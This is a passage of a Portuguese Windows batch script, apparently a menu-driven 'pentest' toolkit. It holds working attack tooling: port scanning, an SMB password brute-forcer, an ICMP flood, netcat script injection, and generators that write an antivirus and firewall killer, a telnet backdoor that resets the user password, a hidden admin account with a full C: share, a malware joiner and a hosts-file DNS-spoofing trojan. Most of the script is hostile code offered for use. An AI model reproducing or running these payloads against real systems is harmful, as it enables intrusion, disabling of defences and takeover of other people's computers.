echo   ^| Port Scan  //\\         ^|                                                             
echo   ^|           // \\         ^|                                                             
echo   ^|          //   \\        ^|                                                             
echo   ^|         //     \\       ^|                                                            
echo   ^|        //       \\      ^|                                                            
echo   +---------------------------+                                                              
echo   ^|                                                                                         
echo   +-^> 1 - Servicos                                                                          
echo   ^|                                                                                         
echo   +-^> 2 - Faixa                                                                             
echo   ^|                                                                                         
echo   +-^> 3 - Retornar ao menu anterior                                                         
echo.                                                                                             
choice /C 123 /M:"Escolha uma das opcoes"                                                         
IF %ERRORLEVEL%==1 goto :service                                                                  
IF %ERRORLEVEL%==2 goto :faixa                                                                    
IF %ERRORLEVEL%==3 goto :C                                                                        
:service                                                                                          
cls                                                                                               
echo.                                                                                             
echo   Faz uma varredura nas portas padr‰es dos principais servicos                               
echo.                                                                                             
SET /P IPNC=Digite o IP:                                                                          
echo.                                                                                             
choice /C SN /M:"Iniciar scan"                                                                     
IF %ERRORLEVEL%==1 goto :service2                                                                  
IF %ERRORLEVEL%==2 goto :netcat1                                                                   
:service2                                                                                           
echo.                                                                                               
netcat -vv %IPNC% 20 21 22 23 25 42 43 53 57 80 110 135 137 138 139 443 445 1080 3389 8080        
echo.                                                                                               
echo   Scan conclu°do!                                                                              
echo.                                                                                               
pause                                                                                               
goto :C                                                                                             
:faixa                                                                                               
cls                                                                                                  
echo.                                                                                                
echo   Faz uma varredura em determinada faixa de portas                                              
echo.                                                                                                
SET /P IPNC=Digite o IP:                                                                             
echo.                                                                                                
SET /P PORTA1=Digite o nß da porta inicial:                                                          
echo.                                                                                                
SET /P PORTA2=Digite o n da porta final:                                                             
echo.                                                                                                
choice /C SN /M:"Iniciar scan"                                                                    
IF %ERRORLEVEL%==1 goto :faixa2                                                                   
IF %ERRORLEVEL%==2 goto :netcat1                                                                  
:faixa2                                                                                              
echo.                                                                                                
netcat -vv %IPNC% -z %PORTA1%-%PORTA2%                                                         
echo.                                                                                                
echo   Scan conclu°do!                                                                               
echo.                                                                                                
pause                                                                                                
goto :C                                                                                              
:netcat2                                                                                             
cls                                                                                                  
echo.                                                                                                
echo   E necessario ter o Netcat instalado na pasta System32!                                        
echo.                                                                                                
echo   netcat.exe nao encontrado!                                                                    
echo.                                                                                                
choice /C SN /M "Deseja baixar o aplicativo"                                                       
IF %ERRORLEVEL%==1 goto :downloadw2                                                                
IF %ERRORLEVEL%==2 goto :C                                                                       
:downloadw2                                                                                        
cls                                                                                                
echo.                                                                                              
echo   A pagina de download sera aberta em seu navegador padrao, aguarde!                          
echo.                                                                                              
start https://mega.nz/#!zdEExThA!qmz6hjGCSabC6_9owQ5qiSTjBtH6dPV_DZMLZIaPn0U                       
choice /C SN /M "Retornar ao menu anterior"                                                      
IF %ERRORLEVEL%==1 goto :C                                                                       
IF %ERRORLEVEL%==2 exit                                                                          
:3C3                                                                                               
cls                                                                                                
echo.                                                                                              
echo   +---------------------------+                                                               
echo   ^| Rastrear rota para um IP  ^|                                                             
echo   ^|      __________________   ^|                                                             
echo   ^|  ==c(______(o(______(_()  ^|                                                             
echo   ^|             )=\          ^|                                                             
echo   ^|            // \\        ^|                                                             
echo   ^|           //   \\       ^|                                                            
echo   ^|          //     \\      ^|                                                            
echo   ^|         //       \\     ^|                                                            
echo   ^|        //         \\    ^|                                                            
echo   +---------------------------+                                                              
echo.                                                                                             
SET /P IPT=Digite o IP:                                                                           
pathping %IPT%                                                                                  
echo.                                                                                             
choice /C SN /M "Retornar ao menu anterior"                                                     
IF %ERRORLEVEL%==1 goto :C                                                                      
IF %ERRORLEVEL%==2 exit                                                                         
:4C4                                                                                              
cls                                                                                               
echo.                                                                                             
echo   +---------------------------+                                                              
echo   ^|      Rastrear um IP       ^|                                                            
echo   ^|      __________________   ^|                                                            
echo   ^|  ==c(______(o(______(_()  ^|                                                            
echo   ^|             )=\          ^|                                                            
echo   ^|            // \\        ^|                                                            
echo   ^|           //   \\       ^|                                                            
echo   ^|          //     \\      ^|                                                            
echo   ^|         //       \\     ^|                                                            
echo   ^|        //         \\    ^|                                                            
echo   +---------------------------+                                                              
echo.                                                                                             
SET /P IPTRACKER=Digite um IP ou URL:                                                             
echo.                                                                                             
start http://www.ip-tracker.org/locator/ip-lookup.php?ip=%IPTRACKER%                            
echo.                                                                                             
choice /C SN /M "Retornar ao menu anterior"                                                     
IF %ERRORLEVEL%==1 goto :C                                                                      
IF %ERRORLEVEL%==2 exit                                                                         
:5C5                                                                                              
cls                                                                                               
echo.                                                                                             
echo   +---------------------------+                                                              
echo   ^|      __________________   ^|                                                            
echo   ^|  ==c(______(o(______(_()  ^|                                                            
echo   ^|             )=\          ^|                                                            
echo   ^|            // \\        ^|                                                           
echo   ^|     SITE  // \\  IP     ^|                                                            
echo   ^|          // DNS \\      ^|                                                             
echo   ^|         //     \\       ^|                                                             
echo   ^|        //       \\      ^|                                                             
echo   +---------------------------+                                                               
echo.                                                                                              
echo   Verificar para qual IP o servidor DNS esta direcionando requisicoes                         
echo   de acesso a determinado site                                                                
echo.                                                                                              
SET /P SDNS=Digite o endereco (URL):                                                               
echo.                                                                                              
SET /P IPDNS=Digite o IP do servidor DNS:                                                          
echo.                                                                                              
nslookup %SDNS% %IPDNS%                                                                        
echo.                                                                                               
choice /C SN /M "Retornar ao menu anterior"                                                       
IF %ERRORLEVEL%==1 goto :C                                                                        
IF %ERRORLEVEL%==2 exit                                                                    
:D                                                                                                  
cls                                                                                                 
echo.                                                                                               
echo *  Pentest                              :================:                                     
echo    ^|                                    ^|^|              ^|^|\                              
echo    +-^> 1 - Ataques                      ^|^|    System    ^|^ \                              
echo    ^|                                    ^|^|     Down     ^|^|  ^|                            
echo    +-^> 2 - Bypass                       ^|^|Please wait...^|^| /                              
echo    ^|                                    ==================                                    
echo    +-^> 3 - Intrusao                     ...../     \.....                                    
echo    ^|                                    :/ ############ /:                                    
echo    +-^> 4 - Retornar ao menu principal   :----------------:                                    
echo.                                                                                               
choice /C 1234 /M "Escolha uma das opcoes"                                                        
IF %ERRORLEVEL%==1 goto :atk10                                                                    
IF %ERRORLEVEL%==2 goto :bypass10                                                                 
IF %ERRORLEVEL%==3 goto :intruso                                                                  
IF %ERRORLEVEL%==4 goto 1x                                                                        
:atk10                                                                                              
cls                                                                                                 
echo.                                                                                               
echo    +---------------------------+                                                               
echo    ^|                           ^|                                                             
echo    ^| ^|^|======[***  ^|                                                           
echo    ^| ^|  Ataques   \           ^|                                                            
echo    ^| ^|_____________\______    ^|                                                            
echo    ^| ^|==[cmd ^>]============\  ^|                                                           
echo    ^| ^|______________________\ ^|                                                            
echo    ^|\(@)(@)(@)(@)(@)(@)(@)/   ^|                                                             
echo    ^|  *********************    ^|                                                             
echo    +---------------------------+                                                               
echo    ^|                                                                                          
echo    +-^> 1 - Ataque Bruteforce em Rede LAN                                                      
echo    ^|                                                                                          
echo    +-^> 2 - Ataque DoS - ICMP FLOOD                                                            
echo    ^|                                                                                          
echo    +-^> 3 - Script injection (Netcat)                                                          
echo    ^|                                                                                          
echo    +-^> 4 - Retornar ao menu anterior                                                          
echo.                                                                                               
choice /C 1234 /M "Escolha uma das opco‰es"                                                       
IF %ERRORLEVEL%==1 goto :1D                                                                       
IF %ERRORLEVEL%==2 goto :2D                                                                       
IF %ERRORLEVEL%==3 goto :3D                                                                       
IF %ERRORLEVEL%==4 goto :D                                                               
:1D                                                                                      
cls                                                                                      
echo.                                                                                    
echo   +-------------------------------+                                                 
echo   ^|                               ^|                                               
echo   ^| Ataque Bruteforce em Rede LAN ^|                                               
echo   ^|                               ^|                                               
echo   +-------------------------------+                                                 
echo   ^|                                                                                
echo   # Requisitos para realizar o ataque:                                              
echo   ^|                                                                                
echo   +-^> Rede LAN - uma (ou +) maquina na rede que tenha um diret¢rio ativo           
echo   ^|              e compartilhado (protegido por senha).                            
echo   ^|                                                                                
echo   +-^> Seu computador - ter um dicionario na pasta "Documentos"                    
echo   ^|                    (ou Documents). O batscript "WinsecurityNE"                
echo   ^|                    tem que estar em algum diret¢rio do disco C:                
echo   ^|                                                                                
echo   +-^> Dicionario - arquivo de texto com nome "dic.txt", que contem uma             
echo                     lista de palavras, combinacoes numericas,                       
echo                     alfanumericas e outros caracteres.                              
echo.                                                                                    
choice /C SN /M "Prosseguir"                                                             
IF %ERRORLEVEL%==1 goto :bflan                                                           
IF %ERRORLEVEL%==2 goto :D                                                               
:bflan                                                                                    
CD C:\Users\%USERNAME%\Documents                                                     
cls                                                                                      
echo.                                                                                    
echo   ^<unidade^>: - IP -  Recurso compartilhado - User                                 
echo.                                                                                    
SET /P bfuni=   Digite a letra da unidade:                                               
echo.                                                                                    
SET /P bfuser=   Digite o nome de usuario:                                               
echo.                                                                                    
SET /P bfip=   Digite o IP:                                                              
echo.                                                                                    
echo   Unidade: ^<%bfuni%:^> - IP: %bfip% - C$ - Usuario: %bfuser%                 
echo.                                                                                    
choice /C SN /M "Iniciar ataque?"                                                        
IF %ERRORLEVEL%==1 goto :atkbf                                                           
IF %ERRORLEVEL%==2 goto :D                                                               
:atkbf                                                                                   
cls                                                                                      
echo.                                                                                    
SetLocal EnableDelayedExpansion                                                          
for /F %%A in (dic.txt) do (                                                          
    echo Testando com %%A                                                             
    net use %bfuni%: \\%bfip%\C$ %%A /user:%bfuser% 2> nul 1> nul           

    rem "!" devido a expansao da variavel.                                            
    if !ERRORLEVEL! equ 0 (                                                           
	        echo [+] Senha correta! %A                                                   
	        net use %bfuni%: /del 1> nul                                                  
	        goto :sair                                                                    
	    ) else (                                                                           
	        rem echo [+] falso                                                             
	    )                                                                                  
)                                                                                       
EndLocal                                                                                
echo.                                                                                   
echo   Ataque concluido!                                                                
echo.                                                                                   
choice /C SN /M "Retornar ao menu anterior"                                             
IF %ERRORLEVEL%==1 goto :atk10                                                          
IF %ERRORLEVEL%==2 exit                                                                 
:sair                                                                                   
EndLocal                                                                                
echo.                                                                                   
choice /C SN /M "Retornar ao menu anterior"                                             
IF %ERRORLEVEL%==1 goto :atk10                                                          
IF %ERRORLEVEL%==2 exit                                                                 
:2D                                                                                        
cls                                                                                        
echo.                                                                                      
echo   Ataque DoS - ICMP FLOOD                                                             
echo.                                                                                      
set /p pcx1=Digite o ip da maquina alvo:                                                   
echo. & echo. & echo.                                                                      
echo   %COMPUTERNAME% ^>^>^>^>^> Attack ^>^>^>^>^> %pcx1%                              
echo. & echo. & echo.                                                                      
choice /C SN /M "Iniciar ataque"                                                          
IF %ERRORLEVEL%==1 goto :atkdos                                                           
IF %ERRORLEVEL%==2 goto :atk10                                                            
:atkdos                                                                                      
cls                                                                                          
start ping -t -l 65500 %pcx1% -w 1                                                         
echo.                                                                                        
echo   O ataque esta em andamento na janela do Prompt que foi aberta...                       
echo.                                                                                         
echo       %COMPUTERNAME%                 %pcx1%                                          
echo       _______________              _______________                                       
echo      ^|  ___________  ^|          ^|  ___________  ^|                                    
echo      ^| ^|   \ /    ^| ^|          ^| ^|   /  \   ^| ^|                                
echo      ^| ^|   0   0   ^| ^|          ^| ^|   0 - 0   ^| ^|                                
echo      ^| ^|     -     ^| ^|  Ataque  ^| ^|    ___    ^| ^|                                
echo      ^| ^|  \___/   ^| ^|    DoS   ^| ^|   (___)   ^| ^|                                
echo      ^| ^|___     ___^| ^|          ^| ^|___________^| ^|                                
echo      ^|_____^|\_/^|_____^|          ^|_______________^|                                  
echo        _^|__^|/\^|_^|_................_^|________^|_                                    
echo       / ********** \             / ********** \                                        
echo     /  ************  \         /  ************  \                                      
echo    --------------------        --------------------                                      
echo.                                                                                         
echo   Para cancelar o ataque, pressione Control-C (na outra janela do Prompt)                
echo.                                                                                         
choice /C SN /M "Retornar ao menu anterior"                                                 
IF %ERRORLEVEL%==1 goto :atk10                                                              
IF %ERRORLEVEL%==2 exit                                                                     
:3D                                                                                           
C:                                                                                            
CD %windir%\system32                                                                       
IF EXIST netcat.exe GOTO :injection                                                           
IF NOT EXIST netcat.exe GOTO :notnetcat                                                       
:notnetcat                                                                                     
echo.                                                                                          
echo   E necessario ter o Netcat instalado na pasta System32!                                  
echo.                                                                                          
echo   netcat.exe n∆o encontrado!                                                              
echo.                                                                                          
choice /C SN /M "Deseja baixar o aplicativo"                                                 
IF %ERRORLEVEL%==1 goto :1download                                                           
IF %ERRORLEVEL%==2 goto :atk10                                                                
:injection											
cls												
CD C:\Users\%USERNAME%\Desktop								
echo.												
echo   +---------------------------+								
echo   ^|                           ^|								
echo   ^| Script injection (Netcat) ^|								
echo   ^|                           ^|								
echo   +---------------------------+								
echo   ^|											
echo   +-^> O script deve estar em sua desktop.							
echo   ^|											
echo   +-^> Ap¢s injetar o script, pressione CRTL+C.						
echo.												
SET /P sip=Digite o IP: 									
echo.												
SET /P sdoor=Digite o nß da porta: 								
echo.												
SET /P scriptx=Digite o nome do script (com extens∆o): 						
echo. & echo. & echo.										
choice /C SN /M:"Iniciar injecao"								
IF %ERRORLEVEL%==1 goto :injectnow								
IF %ERRORLEVEL%==2 goto :3D									
:injectnow											
cls												
echo.												
echo   Injetando %scriptx% na porta %sdoor% do IP %sip%...				
echo.												
netcat %sip% %sdoor% < %scriptx%								
echo.												
choice /C SN /M "Retornar ao menu anterior"							
IF %ERRORLEVEL%==1 goto :atk10								
IF %ERRORLEVEL%==2 exit									
:bypass10											
cls												
echo.												
echo    +----------------------------------------------------+					
echo    ^|                 _           \         .  ./       ^|				
echo    ^| Bypass         ^|=^|        \      .:';'.:..'   /   ^|				
echo    ^|                ^|=^|             (M^^^^.^^~~:.'').      |				
echo    ^|                ^|=^|       -   (/  .    . .\\)  -  ^|				
echo    ^|   O            ^|=^|          ((^| :. ~ ^^  :. .^|))    ^|				
echo    ^|  ^|\\           ^|=^|       -  (\- ^| \ /  ^|  /)  -^|				
echo    ^|  ^|  T          ^|=^|           -\ \     /  /-      ^|				
echo    ^| /\[X].........^|=^|.............\ \   /  /        ^|				
echo    ^|               .^|=^|.                                ^|				
echo    ^|                ...                                 ^|				
echo    +----------------------------------------------------+					
echo    ^|											
echo    +-^> 1 - Gerar AV Killer								
echo    ^|											
echo    +-^> 2 - Gerar Badcom Starter								
echo    ^|											
echo    +-^> 3 - Retornar ao menu anterior							
echo.												
choice /C 123 /M "Escolha uma das opcoes"							
IF %ERRORLEVEL%==1 goto :4D									
IF %ERRORLEVEL%==2 goto :7D									
IF %ERRORLEVEL%==3 goto :D									
:4D												
cls												
echo.												
echo   AV Killer										
echo.												
echo   Atencao! Cuidado para n∆o executar em seu proprio PC o script gerado!			
echo.												
echo   Digite o nome de cada processo do antivirus at°vo no sistema operacional			
echo   Exemplo: antivirus.exe									
echo   Limitei a finalizacao de 10 processos no maximo.						
echo.												
choice /C SN /M "Iniciar"									
IF %ERRORLEVEL%==1 goto :digpro								
IF %ERRORLEVEL%==2 goto :bypass10								
:digpro												
echo.												
set /p Processo01=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro2								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro2											
echo.												
set /p Processo02=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro3								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro3											
echo.												
set /p Processo03=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro4								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro4											
echo.												
set /p Processo04=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro5								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro5											
echo.												
set /p Processo05=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro6								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro6											
echo.												
set /p Processo06=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro7								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro7											
echo.												
set /p Processo07=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro8								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro8											
echo.												
set /p Processo08=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro9								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro9											
echo.												
set /p Processo09=Digite:									
echo.												
choice /C SN /M "Acrescentar outro processo"							
IF %ERRORLEVEL%==1 goto :digpro10								
IF %ERRORLEVEL%==2 goto :goavkill								
:digpro10											
echo.												
set /p Processo10=Digite:									
echo.												
choice /C SN /M "Gerar AV Killer"								
IF %ERRORLEVEL%==1 goto :goavkill								
IF %ERRORLEVEL%==2 goto :D									
:goavkill											
IF EXIST AVKill.bat GOTO :goavkill0								
IF NOT EXIST AVKill.bat GOTO :goavkill2								
:goavkill2											
echo @echo off >> AVKill.bat									
echo break off >> AVKill.bat									
echo cd\ >> AVKill.bat										
echo netstop wscsvc >> AVKill.bat								
echo sc config wscsvc start=disabled >> AVKill.bat						
echo cls >> AVKill.bat										
echo netsh firewall set opmode mode=disabled >> AVKill.bat					
echo net stop SharedAccess >> AVKill.bat							
echo cls >> AVKill.bat										
echo goto antivir >> AVKill.bat									
echo :antivir >> AVKill.bat									
echo taskkill /f /im %Processo01% >> AVKill.bat						
echo taskkill /f /im %Processo02% >> AVKill.bat						
echo taskkill /f /im %Processo03% >> AVKill.bat						
echo taskkill /f /im %Processo04% >> AVKill.bat						
echo taskkill /f /im %Processo05% >> AVKill.bat						
echo taskkill /f /im %Processo06% >> AVKill.bat						
echo taskkill /f /im %Processo07% >> AVKill.bat						
echo taskkill /f /im %Processo08% >> AVKill.bat						
echo taskkill /f /im %Processo09% >> AVKill.bat						
echo taskkill /f /im %Processo10% >> AVKill.bat						
echo cls >> AVKill.bat										
echo exit >> AVKill.bat										
echo.												
echo   "AVKill.bat" gerado com sucesso!							
echo.												
pause												
goto :D												
:goavkill0											
echo.												
echo   Nao sera poss°vel gerar o AV Killer!							
echo   "AVKill.bat" ja existe no diret¢rio atual!						
echo.												
pause												
goto :D												
:intruso											
cls												
echo.												
echo    +------------------------------------------+						
echo    ^|                                          ^|						
echo    ^|                _,--=--._                 ^|						
echo    ^|              ,'    _    `.               ^|						
echo    ^|             -    _(_)_o   -              ^|						
echo    ^|        ____'    /_  _/]    `____         ^|						
echo    ^| -=====::(+):::::::::::::::::(+)::=====-  ^|						
echo    ^|          (+).''''''''''''''',(+)          |						
echo    ^|              . Instrus∆o ,               ^|						
echo    ^| crj            `  -=-  '                 ^|						
echo    ^|                                          ^|						
echo    +------------------------------------------+						
echo    ^|											
echo    +-^> 1 - Gerar Backdoor (conex∆o direta)						
echo    ^|											
echo    +-^> 2 - Gerar Backdoor de Rede LAN							
echo    ^|											
echo    +-^> 3 - Gerar Trojan de DNS Spoofing							
echo    ^|											
echo    +-^> 4 - Retornar ao menu anterior							
echo.												
choice /C 1234 /M "Escolha uma das opcoes"							
IF %ERRORLEVEL%==1 goto :5D									
IF %ERRORLEVEL%==2 goto :6D									
IF %ERRORLEVEL%==3 goto :8D									
IF %ERRORLEVEL%==4 goto :D									
:5D												
cls												
echo. 												
echo   Backdoor (conex∆o direta)								
echo.												
echo   Atencao! Cuidado para n∆o executar em seu pr¢prio PC o script gerado!			
echo.												
echo   Acao do Backdoor: vai habilitar o servidor telnet na maquina alvo			
echo   e mudar a senha de usuario do sistema para "admin123".					
echo.												
echo   Como utilizar: tendo sido executado o backdoor na maquina alvo, voce			
echo   tera que conectar-se a ela atraves do telnet, apos isso sera				
echo   solicitado a senha de usuario (que vai ser admin123).					
echo.												
echo   Condicoes para uso:									
echo   ^|											
echo   +-^> 1 - O backdoor ter sido executado na maquina alvo;					
echo   ^|											
echo   +-^> 2 - Voce ter o ip da maquina alvo;							
echo   ^|											
echo   +-^> 3 - A maquina alvo estar online;							
echo   ^|											
echo   +-^> 4 - Conectar-se a maquina alvo atraves do telnet.					
echo.												
choice /C SN /M:"Gerar backdoor agora"							
IF %ERRORLEVEL%==1 goto :backdoorx								
IF %ERRORLEVEL%==2 goto :intruso								
:backdoorx												
cls													
echo. 												
echo       _______________                _______________					        
echo      ^|  ___________  ^|            ^|  ___________  ^|						
echo      ^| ^|   \ /    ^| ^|          ^| ^|   /  \   ^| ^|						
echo      ^| ^|   0   0   ^| ^|          ^| ^|   0 - 0   ^| ^|						
echo      ^| ^|     -     ^| ^| Backdoor ^| ^|    ___    ^| ^|						
echo      ^| ^|  \___/   ^| ^|          ^| ^|   (___)   ^| ^|						
echo      ^| ^|___     ___^| ^|  Conex∆o ^| ^|___________^| ^|						
echo      ^|_____^|\_/^|_____^|  direta ^|_______________^|					        
echo        _^|__^|/\^|_^|_................_^|________^|_						
echo       / **********\              / **********\							
echo     /  ************ \          /  ************ \							
echo    --------------------        --------------------						
echo.													
IF EXIST Teste_de_intrusao-Backdoor.bat GOTO :backdoorz							
IF NOT EXIST Teste_de_intrusao-Backdoor.bat GOTO :backdoory						
:backdoory												
echo.													
echo @echo off >> Teste_de_intrusao-Backdoor.bat							
echo sc config TlntSvr start= auto >> Teste_de_intrusao-Backdoor.bat					
echo net user %%USERNAME%% admin123 >> Teste_de_intrusao-Backdoor.bat				
echo net start telnet >> Teste_de_intrusao-Backdoor.bat							
echo exit >> Teste_de_intrusao-Backdoor.bat								
echo   "Teste_de_intrusao-Backdoor.bat" gerado com sucesso!						
echo.													
pause													
goto :D													
:backdoorz												
echo.													
echo   N∆o sera poss°vel gerar o backdoor!								
echo   "Teste_de_intrusao-Backdoor.bat" ja existe no diretorio atual!					
echo.													
pause													
goto :D													
:6D													
cls													
echo.													
echo   Backdoor de Rede LAN										
echo.													
echo   Atencao! Cuidado para nao executar em seu pr¢prio PC o script gerado!				
echo.													
echo   Acao do Backdoor: vai habilitar o servico de compartilhamento de arquivos			
echo   em rede na maquina alvo. So funciona em maquinas da sua rede LAN!				
echo.													
echo   Como utilizar: tendo sido executado o backdoor na maquina alvo, voce				
echo   tera que conectar-se a ela atraves do servico de compartilhamento de				
echo   arquivos do Windows (vai estar dispon°vel na janela "Computador").				
echo   Devera clicar no °cone do compartilhamento e efetuar login e senha.				
echo.													
echo   Condicoes para uso:										
echo   ^|												
echo   +-^> 1 - O backdoor ter sido executado na maquina alvo;						
echo   ^|												
echo   +-^> 2 - A maquina alvo estar online;								
echo   ^|												
echo   +-^> 3 - Conectar-se a maquina alvo atraves do compartilhamento 					
echo            de arquivos.										
echo.													
choice /C SN /M:"Gerar backdoor agora"								
IF %ERRORLEVEL%==1 goto :backdoorlan									
IF %ERRORLEVEL%==2 goto :intruso									
:backdoorlan												
IF EXIST Teste_de_intrusao-Backdoor_LAN.bat GOTO :backdoorlan0						
IF NOT EXIST Teste_de_intrusao-Backdoor_LAN.bat GOTO :backdoorlan2					
:backdoorlan2												
cls													
echo.													
set /p login1x=Digite um login:										
echo.													
set /p senha1x=Digite uma senha:									
echo.													
set /p share1x=Digite um nome de compartilhamento:							
echo. 												     
echo       _______________                _______________						
echo      ^|  ___________  ^|            ^|  ___________  ^|						
echo      ^| ^|   \ /    ^| ^|          ^| ^|   /  \   ^| ^|						
echo      ^| ^|   0   0   ^| ^|          ^| ^|   0 - 0   ^| ^|						
echo      ^| ^|     -     ^| ^| Backdoor ^| ^|    ___    ^| ^|						
echo      ^| ^|  \___/   ^| ^|    de    ^| ^|   (___)   ^| ^|						
echo      ^| ^|___     ___^| ^| Rede LAN ^| ^|___________^| ^|						
echo      ^|_____^|\_/^|_____^|         ^|_______________^|						
echo        _^|__^|/\^|_^|_................_^|________^|_						
echo       / **********\              / **********\							
echo     /  ************ \          /  ************ \							
echo    --------------------        --------------------						
echo.													
echo @echo off >> Teste_de_intrusao-Backdoor_LAN.bat							
echo net user %login1x% %senha1x% /add >> Teste_de_intrusao-Backdoor_LAN.bat 			
echo net localgroup Administradores %login1x% /add >> Teste_de_intrusao-Backdoor_LAN.bat		
echo net share %share1x%=C:\ /GRANT:todos,full >> Teste_de_intrusao-Backdoor_LAN.bat			
echo exit >> Teste_de_intrusao-Backdoor_LAN.bat								
echo   "Teste_de_intrusao-Backdoor_LAN.bat" gerado com sucesso!					
echo.													
pause													
goto :D													
:backdoorlan0												
echo.													
echo   Nao sera poss°vel gerar o backdoor!								
echo   "Teste_de_intrusao-Backdoor_LAN.bat" ja existe no diretorio atual!				
echo.													
pause													
goto :D													
:7D													
cls													
echo.													
echo   Badcom Starter (joiner)										
echo.													
echo   Atencao! Cuidado para n∆o executar em seu pr¢prio PC o script gerado!				
echo.													
echo   Script em bat que iniciara outros 2 arquivos (executaveis):					
echo   Arquivo 1 - arquivo legitimo									
echo   Arquivo 2 - arquivo malicioso									
echo.													
set /p idx01=Digite o nome do arquivo 1 (.exe):								
echo.													
set /p idx02=Digite o nome do arquivo 2 (.exe):								
echo.													
choice /C SN /M "Gerar Badcom Starter"								
IF %ERRORLEVEL%==1 goto :badstart									
IF %ERRORLEVEL%==2 goto :bypass10									
:badstart												
IF EXIST starter.bat GOTO :badstart0									
IF NOT EXIST starter.bat GOTO :badstart2								
:badstart2												
echo.													
echo @echo off >> starter.bat										
echo start %idx01% >> starter.bat									
echo start %idx02% >> starter.bat									
echo exit >> starter.bat										
echo   "starter.bat" gerado com sucesso!								
echo.													
pause													
goto :D													
:badstart0												
echo.													
echo   N∆o sera poss°vel gerar o badcom!								
echo   "starter.bat" ja existe no diret¢rio atual!							
echo.													
pause													
goto :D													
:8D													
cls													
echo.													
echo   Trojan de DNS Spoofing										
echo.													
echo   Atencao! Cuidado para nao executar em seu pr¢prio PC o script gerado!				
echo.													
echo   Acao do trojan: ap¢s de ser executado na maquina alvo, fara alteracoes 				
echo   no arquivo hosts do Windows, redirecionando o acesso aos sites que voce				
echo   determinou para ip's de outros dom°nios de sua escolha.						
echo   Limitei a criacao de redirecionamentos para 2 no maximo.						
echo.													
echo   Depois do pentest, lembre-se de desfazer manualmente as alteracoes				
echo   no arquivo host da maquina alvo!									
echo.													
choice /C SN /M "Iniciar processo de criacao"								
IF %ERRORLEVEL%==1 goto :gotrojan									
IF %ERRORLEVEL%==2 goto :intruso									
:gotrojan												
cls													
echo.													
set /p redirect1A=Digite um dom°nio (URL):								
echo.													
set /p redirect1B=Digite um IP:										
echo.													
echo   1 - Acrescentar outro redirecionamento								
echo   2 - Gerar Trojan agora										
echo.													
choice /C 12 /M "Escolha uma das opcoes"								
IF %ERRORLEVEL%==1 goto :gotrojan2									
IF %ERRORLEVEL%==2 goto :7Dnow1									
:gotrojan2												
echo.													
set /p redirect2A=Digite um dom°nio (URL):								
echo.													
set /p redirect2B=Digite um IP:										
echo.													
choice /C SN /M "Gerar Trojan agora"									
IF %ERRORLEVEL%==1 goto :7Dnow2									
IF %ERRORLEVEL%==2 goto :D										
:7Dnow1													
IF EXIST Teste_de_intrusao-DNS_Spoof.bat GOTO :aviso0							
IF NOT EXIST Teste_de_intrusao-DNS_Spoof.bat GOTO :7Dnow1x						
:7Dnow1x												
cls													
echo.             											
echo          !\_______________________/!\								
echo          !!                         !! \								
echo          !!    Loading Trojan...    !!  \								
echo          !!                         !!  !								
echo          !!       _^|                !!  !								
echo          !!      (_\_____/         !!  !								
echo          !!        \_____^|         !!  !								
echo          !!        _(     )_        !!  !  							
echo          !!       \_______/        !!  /								
echo          !!_________________________!! /								
echo          !/________________________\!/								
echo             _\_________________/__/!_								
echo           !_______________________!/								
echo          ________________________									
echo         /oooo  oooo  oooo  oooo /!									
echo        /ooooooooooooooooooooooo/ /									
echo       /ooooooooooooooooooooooo/ /									
echo      /C=_____________________/_/									
echo @echo off >> Teste_de_intrusao-DNS_Spoof.bat							
echo echo. >> Teste_de_intrusao-DNS_Spoof.bat								
echo cd ^\ >> Teste_de_intrusao-DNS_Spoof.bat								
echo attrib hosts ^/s >> Teste_de_intrusao-DNS_Spoof.bat						
echo cd windows^\System32^\drivers^\etc >> Teste_de_intrusao-DNS_Spoof.bat				
echo ren hosts hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat						
echo echo %redirect1B% %redirect1A% ^> hosts.txt >> Teste_de_intrusao-DNS_Spoof.bat			
echo ren hosts.txt hosts >> Teste_de_intrusao-DNS_Spoof.bat						
echo exit >> Teste_de_intrusao-DNS_Spoof.bat								
echo.													
echo   "Teste_de_intrusao-DNS_Spoof.bat" gerado com sucesso!						
echo.													
pause													
goto :D													
:7Dnow2													
IF EXIST Teste_de_intrusao-DNS_Spoof.bat GOTO :aviso0							
IF NOT EXIST Teste_de_intrusao-DNS_Spoof.bat GOTO :7Dnow2x						
:7Dnow2x												
cls													
echo.  												       
echo          !\________________________/!\								
echo          !!                         !! \								
echo          !!    Loading Trojan...    !!  \								
echo          !!                         !!  !								
echo          !!       _^|                !!  !								
echo          !!      (_\_____/         !!  !								
echo          !!        \_____^|         !!  !								
echo          !!        _(     )_        !!  !  							
echo          !!       \_______/        !!  /								
echo          !!_________________________!! /								
echo          !/________________________\!/								
echo            __\_________________/__/!_								
echo           !_______________________!/								
echo          ________________________									
echo         /oooo  oooo  oooo  oooo /!									
echo        /ooooooooooooooooooooooo/ /									
echo       /ooooooooooooooooooooooo/ /									
echo      /C=_____________________/_/									
echo @echo off >> Teste_de_intrusao-DNS_Spoof.bat							
echo echo. >> Teste_de_intrusao-DNS_Spoof.bat								
echo cd ^\ >> Teste_de_intrusao-DNS_Spoof.bat								
echo attrib hosts ^/s >> Teste_de_intrusao-DNS_Spoof.bat						
echo cd windows^\System32^\drivers^\etc >> Teste_de_intrusao-DNS_Spoof.bat				
